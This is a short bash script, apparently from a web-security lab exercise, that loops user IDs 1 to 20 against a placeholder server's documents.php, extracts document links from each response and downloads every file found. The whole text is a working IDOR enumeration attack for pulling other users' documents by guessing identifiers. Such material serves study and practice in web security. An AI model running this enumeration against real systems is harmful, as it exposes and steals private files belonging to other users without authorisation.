# Alternative script option to find any extension
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..20}; do
    for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\\.\\w+"); do
        curl -O $url/$link
    done
done
